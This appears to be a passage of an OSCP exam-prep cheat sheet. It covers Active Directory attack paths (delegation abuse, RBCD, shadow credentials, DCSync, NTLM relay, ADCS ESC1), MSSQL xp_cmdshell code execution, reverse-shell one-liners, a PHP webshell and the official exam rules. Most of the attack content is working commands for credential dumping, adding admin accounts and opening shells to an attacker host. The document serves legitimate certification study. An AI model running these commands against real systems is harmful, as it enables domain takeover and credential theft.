# Coerce the DC to auth to you (PrinterBug / PetitPotam):
python3 printerbug.py corp.local/stephanie:Password123@192.168.x.100 APP01.corp.local
# Rubeus captures DC01$'s TGT → inject and DCSync:
Rubeus.exe ptt /ticket:<base64 TGT>
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

Result: A captured Domain Controller machine-account TGT → pass-the-ticket → DCSync the entire domain.

07
Constrained Delegation (S4U2Proxy)
Kerberos · Impersonation

Recognize it: BloodHound's "Find Computers with Constrained Delegation" shows a machine/service account whose msDS-AllowedToDelegateTo attribute lists a specific SPN (e.g. cifs/DC01). You control the delegating account.

Scenario: WEBSVC$ can delegate to cifs/DC01.corp.local. You've compromised WEBSVC's password/hash — that lets you impersonate any user (including Administrator) to that one service.

getST.py -spn cifs/DC01.corp.local -impersonate Administrator \
    -dc-ip 192.168.x.100 corp.local/WEBSVC$:'password_or_hash'

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

Result: A ticket that lets you act as Administrator against the allowed SPN — usually enough to psexec/wmiexec straight onto the DC.

08
Resource-Based Constrained Delegation (RBCD)
Kerberos · Requires Write Access

Recognize it: You have GenericAll/GenericWrite/WriteProperty over a computer object, OR you can create machine accounts (default MachineAccountQuota is 10 per user) and there's a target machine you want to land on. Unlike classic delegation, the target object controls who may delegate to it via msDS-AllowedToActOnBehalfOfOtherIdentity.

Scenario: Low-priv stephanie has GenericWrite over computer FILESRV$. She creates a fake machine account, points FILESRV's RBCD attribute at it, then impersonates Administrator through that fake machine to FILESRV.

# 1. Create a machine account you control (uses your MAQ):
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'P@ssw0rd123!' \
    -dc-host DC01.corp.local corp.local/stephanie:Password123

# 2. Set FAKE01$ as trusted to delegate to FILESRV$:
rbcd.py -delegate-from 'FAKE01$' -delegate-to 'FILESRV$' -action write \
    -dc-ip 192.168.x.100 corp.local/stephanie:Password123

# 3. S4U2Proxy — impersonate Administrator through FAKE01$ onto FILESRV:
getST.py -spn cifs/FILESRV.corp.local -impersonate Administrator \
    -dc-ip 192.168.x.100 corp.local/FAKE01$:'P@ssw0rd123!'

export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass corp.local/Administrator@FILESRV.corp.local

Result: Full admin access to the target computer as Administrator — one of the most reliable "I have write access to a computer object" wins.

09
Shadow Credentials (msDS-KeyCredentialLink)
Requires Write Access · Cert-Based

Recognize it: Same ACL edge as card 05 (GenericAll/GenericWrite/AddKeyCredentialLink) but over a target where a password reset would be too noisy/break something, or where you want a stealthier, key-based takeover instead. Works because Windows lets you authenticate via a certificate registered on the account's msDS-KeyCredentialLink attribute (PKINIT).

Scenario: stephanie has GenericWrite over jdoe. Instead of resetting jdoe's password (which locks jdoe out and alerts them), she attaches her own certificate to jdoe's account and authenticates as jdoe with it — jdoe's real password never changes.

# Add a shadow credential and get a usable cert for jdoe:
certipy account update -u 'stephanie@corp.local' -p 'Password123' \
    -target 192.168.x.100 -user jdoe -shadow auto

# Use the resulting cert to request a TGT (PKINIT):
certipy auth -pfx jdoe.pfx -dc-ip 192.168.x.100 -domain corp.local
# → returns jdoe's NT hash directly, usable for pass-the-hash too

Result: Full takeover of the target account (TGT + NT hash) without ever touching their real password — quieter than a forced reset.

10
DCSync Rights (Replicating Directory Changes)
Domain-Dominance · Endgame

Recognize it: BloodHound's "Find Principals with DCSync Rights" shows an account (sometimes non-obvious, like a backup or monitoring service account) holding Replicating Directory Changes + Replicating Directory Changes All on the domain object.

Scenario: A backup service account svc_backup was granted DCSync rights for legitimate backup software years ago and never revisited. You've cracked/looted its creds via card 02 or 03.

secretsdump.py corp.local/svc_backup:'Password123'@192.168.x.100 -just-dc-ntlm
# or with mimikatz on a domain-joined box:
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt   # for Golden Ticket

Result: NTLM hashes for every account in the domain, including Administrator and krbtgt — this is Domain Admin, and the krbtgt hash lets you forge Golden Tickets afterward.

11
Local Admin Password Reuse (Lateral Move)
No BloodHound Needed

Recognize it: No fancy delegation or ACL edge — you dumped a local SAM/LSASS on one box and the local Administrator hash/password is identical on a second machine (extremely common when machines were cloned from the same base image).

Scenario: You root MS01 and dump its local SAM. The local Administrator hash on MS01 also works as local admin on MS02 — no domain privilege needed at all.

# Spray the looted local-admin hash across every AD-joined host you know about:
nxc smb 192.168.x.0/24 -u Administrator -H '<NTLM hash>' --local-auth

# Once confirmed on MS02:
psexec.py -hashes :<NTLM hash> Administrator@192.168.x.102 -local-auth
# or:
wmiexec.py -hashes :<NTLM hash> Administrator@192.168.x.102

Result: Admin on a second machine purely via password/hash reuse — always try this before reaching for anything more complex.

GPO Abuse (GenericWrite over a Group Policy Object)
Affects Every Linked Computer

Recognize it: BloodHound shows GenericWrite/GenericAll on a GPO object that is linked to an OU containing computers or users you want. Edit the GPO and every linked machine will run whatever you push on its next policy refresh.

Scenario: stephanie has write access to a GPO linked to the "Workstations" OU, which includes MS02. She pushes an immediate scheduled task that adds her to the local Administrators group.

# Easiest with SharpGPOAbuse from a Windows foothold:
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount stephanie --GPOName "Workstation Policy"
# Then force a policy refresh on the target (or wait ~90 min):
gpupdate /force   # run on target if you have any code exec there
# From Linux (pygpoabuse):
pygpoabuse.py corp.local/stephanie:Password123 -gpo-id <GPO-GUID> -dc-ip 192.168.x.100 \
    -command 'net localgroup administrators stephanie /add'

Result: Local admin on every computer that GPO applies to, on next refresh — powerful but noisy; scope it to just the box you need.

13
NTLM Coercion + Relay to LDAP
PetitPotam / PrinterBug → Relay

Recognize it: SMB signing is not enforced on a target (check with nxc smb --gen-relay-list), and you have a way to make another machine (ideally a DC) authenticate to you — via the MS-EFSR (PetitPotam) or spooler (PrinterBug) coercion methods. You relay that authentication straight into LDAP.

Scenario: SMB signing is disabled on DC02 in a multi-DC environment. You coerce it to authenticate to your box, relay to LDAP on DC02, and use that session to grant yourself RBCD or DCSync rights.

# 1. Start the relay, targeting LDAP(S) on the vulnerable DC:
ntlmrelayx.py -smb2support -t ldaps://192.168.x.101 --delegate-access --remove-mic

# 2. Coerce the target DC to authenticate to you:
python3 PetitPotam.py -u stephanie -p 'Password123' -d corp.local \
    <your-IP> 192.168.x.101
# (or, if signing is required, use PrinterBug against a non-DC vulnerable host)

# 3. ntlmrelayx now holds an authenticated LDAP session as DC02$ — use its
#    interactive shell to add a computer account and grant it RBCD on the target.

Result: An authenticated machine-account LDAP session you can turn into RBCD (card 08) or a straight DCSync grant — a way in when there's no direct ACL misconfiguration to abuse.

14
AD CS Misconfigured Template (ESC1)
Certificate Services

Recognize it: Active Directory Certificate Services (ADCS) is running, and certipy find -vulnerable flags a template as ESC1 — enrollee-supplied SAN is enabled, low-priv "Domain Users" can enroll, and no manager approval is required. Lets any user request a cert as someone else.

Scenario: A legacy template UserAuthV1 lets any domain user enroll and specify an arbitrary Subject Alternative Name. You request a certificate claiming to be Administrator.

# Find vulnerable templates:
certipy find -u stephanie@corp.local -p Password123 -dc-ip 192.168.x.100 -vulnerable

# Request a cert impersonating Administrator via the vulnerable template:
certipy req -u stephanie@corp.local -p Password123 -ca CORP-CA \
    -template UserAuthV1 -upn administrator@corp.local -dc-ip 192.168.x.100

# Use the cert to authenticate and pull the NT hash:
certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100

Result: Administrator's NT hash straight from a certificate request — no cracking, no delegation, works even against Protected Users since it's PKINIT-based.

MSSQL — RCE & Lateral Movement

MSSQL is a major OSCP attack path: initial RCE via xp_cmdshell, lateral movement via linked servers, hash capture via UNC injection, privesc via impersonation.
What's happening here

MSSQL is Microsoft's database server (port 1433) — but it can run operating-system commands. If you get in as a privileged DB user (often sa), you can switch on a feature called xp_cmdshell that runs Windows commands as the database service account — instant code execution.

How you usually get in: default/blank sa password, creds found in a web app's web.config, or a SQL injection that reaches the DB. Once inside, the steps below are a recipe: connect → enumerate → enable xp_cmdshell → shell. Even if you're not sa, the impersonation trick (Step 4) can promote you.

Step 1: Connect

mssqlclient.py corp.local/sa@<TARGET_IP> -windows-auth
mssqlclient.py sa@<TARGET_IP>
mssqlclient.py corp.local/user:'pass'@<TARGET_IP> -windows-auth

Step 2: Enumerate

SELECT @@version;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');    -- 1 = sysadmin!
SELECT name FROM master.dbo.sysdatabases;

-- Check impersonation rights:
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Linked servers:
EXEC sp_linkedservers;
SELECT srvname, isremote FROM master..sysservers;

Step 3: Enable xp_cmdshell → RCE

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64_PAYLOAD>';
EXEC xp_cmdshell 'net user hax P@ss123! /add && net localgroup administrators hax /add';

Step 4: Impersonation (non-sysadmin → sysadmin)

EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- Should return 1
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

Step 5: Linked Server Lateral Movement

-- Single hop (MS01 → MS02):
SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT @@version, SYSTEM_USER');

Pivoting & Tunneling

Why this matters

Pivoting = using a machine you own as a stepping stone to reach machines you can't see. In the AD set, you can reach MS01 directly — but MS02 and the DC sit on an internal network your Kali box has no route to. MS01 can talk to them, so you turn MS01 into a tunnel and route your tools through it.

Simple analogy: you can't enter a locked office building, but you've befriended someone inside who passes your messages back and forth. That insider is your pivot.

For OSCP, learn one tool well — Ligolo-ng. It's the simplest: start the proxy on Kali, run the agent on MS01, and suddenly the internal subnet behaves like it's directly reachable. Don't drown in five different tools; master Ligolo and keep Chisel/SSH as backups.

# Windows:

Password Attacks

Concept first

Systems never store your real password — they store a hash: a scrambled, one-way fingerprint of it. "Cracking" means guessing passwords, hashing each guess, and checking if it matches the stolen hash. You're not reversing the hash; you're racing through millions of guesses.

Two situations, two approaches: if you have a stolen hash → crack it offline with hashcat/john (fast, silent, no lockouts). If you have a login form / service and no hash → brute-force online with hydra (slower, noisy, can lock accounts — use sparingly).

The first step is always identifying the hash type so you pick the right hashcat mode. rockyou.txt is your go-to wordlist; for OSCP you rarely need anything fancier.

Shells & Upgrades

Concept first

A reverse shell makes the target connect back to you. You start a listener on Kali (nc -lvnp 4444), then trick the target into running a one-liner that dials home to your IP and port. This works even through firewalls, which is why it's the default — a bind shell (where you connect to the target) usually gets blocked by inbound filtering.

Always upgrade your shell. The first shell you get is "dumb" — no arrow keys, no tab-complete, and Ctrl-C kills it. Upgrading to a full TTY (the python3 pty trick below) makes it behave like a real terminal so you can use sudo, text editors, and SSH. Do this immediately every time.

Reverse Shell One-Liners

# Bash:
bash -i >& /dev/tcp/<LHOST>/4444 0>&1

# Python3:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP webshell:
<?php system($_GET["cmd"]); ?>

# Netcat (mkfifo):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f

# msfvenom payloads:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe

When You're Stuck — Troubleshooting

Don't panic

Feeling stuck is normal and happens on every box, in the lab and in the exam. Being stuck almost never means "I need a harder exploit." It means you've missed information. Work this list top to bottom before you give up on a machine.

The "I'm Stuck" Checklist

  • Did I scan all 65,535 TCP ports (nmap -p-), not just the top 1000?
  • Did I check UDP (SNMP / TFTP / DNS often hide the foothold)?
  • Did I note the exact version of every service and run searchsploit on each?
  • On web: did I check source code, robots.txt, /.git, comments and brute-force directories with a bigger wordlist?
  • Did I try VHosts / subdomains (add the domain to /etc/hosts first)?
  • Did I try default, blank and anonymous credentials on every login?
  • Did I reuse every password/hash I've found against every other service and user?
  • Did I read .bash_history, PowerShell history, config files and home directories?
  • Did I re-run my enumeration as the new user after getting a foothold?
  • Is my reverse shell failing? Try a different port (80, 443, 53) — outbound filtering is common.

Stuck Decision Tree

STUCK? │ ├─ No foothold yet? │ └─ → You missed something in ENUMERATION. Re-scan all ports, │ re-check every service version, fuzz harder, try default creds. │ ├─ Have a shell but can't escalate? │ └─ → Run linpeas/winPEAS again. Check sudo -l, SUID, cron, │ stored passwords. Re-enumerate AS the current user. │ ├─ Exploit won't fire? │ └─ → Wrong version/arch? Read the exploit code. Try a │ different PoC. Check the target can reach YOU (firewall). │ └─ Tried everything for 30+ min? └─ → Move to another box. Come back with fresh eyes. Take a short break — stepping away solves more boxes than staring at the screen does.
✓ Exam-day reminder: You have ~24 hours. Rotating between machines when stuck is a strategy, not a failure. A 15-minute walk has rescued more OSCP attempts than any single tool. Enumerate everything. Try harder — but try smarter.

Exam Day Rules & Restrictions (Official)

Read this before exam day — not after.

Everything below is pulled directly from OffSec's official OSCP+ Exam Guide (last updated April 2026). Every other section of this guide teaches technique — this section is the rulebook. A perfect exploit chain scores zero if it breaks one of these rules.

Banned Tools & Techniques

CategoryExamples (named explicitly by OffSec)
SpoofingIP, ARP, DNS, NBNS spoofing — any of it
Commercial toolsMetasploit Pro, Burp Suite Pro, Cobalt Strike
Automatic exploitation toolsdb_autopwn, browser_autopwn, SQLmap, SQLninja — yes, sqlmap is explicitly named
Mass vulnerability scannersNessus, Nexpose, OpenVAS, Canvas, Core Impact, SAINT
AI chatbots — anyChatGPT, Gemini, DeepSeek, OffSec KAI, YouChat — third-party help, violates Academic Policy

Allowed and encouraged: Nmap (+ NSE), Nikto, Burp Free, DirBuster, gobuster/ffuf/feroxbuster, manual exploitation — anything that isn't automating the actual exploit decision for you. Discord is fine to read for general research; asking anyone for exam-specific help is not.

Metasploit Restrictions (Official Wording)

This is the rule people misremember the most — read it exactly as OffSec wrote it.
  • ✓ msfvenom and multi/handler (exploit/multi/handler) — unrestricted, use on every target, as many times as you like
  • ✓ Metasploit Auxiliary, Exploit, and Post modules, and the Meterpreter payload — allowed against exactly one target of your choice, unlimited times against that one target
  • ✗ The moment you use a module or Meterpreter against your chosen target — even if the attack fails — that choice is locked in. You cannot use Metasploit/Meterpreter against any other machine for the rest of the exam
  • ✗ You cannot use the check command against multiple boxes to "test" before picking your one target — running check counts as using it on that machine
  • ✗ Metasploit cannot be used for pivoting — routing through it to reach a second host counts as touching that second host
  • ✗ The same limits apply through any other interface that wraps Metasploit — Armitage, Cobalt Strike, Metasploit Community Edition, etc.

AI Usage Policy

Zero exceptions, zero gray area. Using any LLM or AI chatbot during the live exam — OffSec KAI, ChatGPT, Gemini, DeepSeek, YouChat, or anything similar — is treated as receiving third-party help and sharing exam information, both violations of OffSec's Academic Policy. This applies even to tools you already have open; if it can answer "how do I exploit this", close it before the exam starts.

You are NOT required to disable general AI features baked into unrelated tools (Notion AI, Google's AI Overview in search results) — the restriction is specifically about asking an AI to help you solve exam objectives.

Proof File & Screenshot Rules

⚠ The #1 silent point-killer: reading proof.txt through a web shell.

Proof must come from an interactive shell using cat/type from the file's original location — /root/proof.txt or Administrator's Desktop for proof.txt, any unprivileged user's home/Desktop for local.txt. Reading it any other way (web shell, file download, etc.) = zero points for that entire machine, no exceptions.

  • ✓ Screenshot must show the file contents AND the target's IP in the same frame (ip a / ifconfig / ipconfig)
  • ✓ Windows: shell must run as SYSTEM, Administrator, or a user with Administrator privileges for full points
  • ✓ Linux: shell must be root for full points
  • ✓ Submit proof contents in the exam control panel before time ends — and include the screenshot in your report. Both, not either.

Machine Reverts

You get 24 reverts total, resettable once during the exam. All machines start freshly reverted — you won't need one at the beginning. Click once and wait; don't spam the button.

Instant Zero-Point Triggers (Official List)

These aren't "point deductions" — they're a hard zero for that entire target, no partial credit, no appeal:
  • ✗ Using a restricted/banned tool on that target (see the table above)
  • ✗ Using Metasploit Auxiliary/Exploit/Post modules on more than one machine
  • ✗ Using the Meterpreter payload on more than one machine
  • ✗ Not providing local.txt/proof.txt contents in both the control panel and an interactive-shell screenshot
  • ✗ Insufficient documentation for that target's exploitation path

Common Reasons Candidates Fail (Community + Official)

  • ✗ Rabbit-holing one box for hours past the 45-min rotate rule — hardest habit to break under pressure
  • ✗ Skipping full-range scans (-p- / UDP top ports) and tunnel-visioning on the first open port
  • ✗ Using sqlmap / automated tools out of habit → zero points on an otherwise-solved box
  • ✗ Getting proof.txt through a web shell instead of an interactive one
  • ✗ No sleep before report writing → 4-6 exhausted hours produce an unclear report that loses points on machines actually rooted
  • ✗ Screenshots missing the IP, or taken after the VPN disconnected (can't retake — plan ahead)
  • ✗ Starting AD late instead of in the first 3 hours, then running out of time on the 40-point set
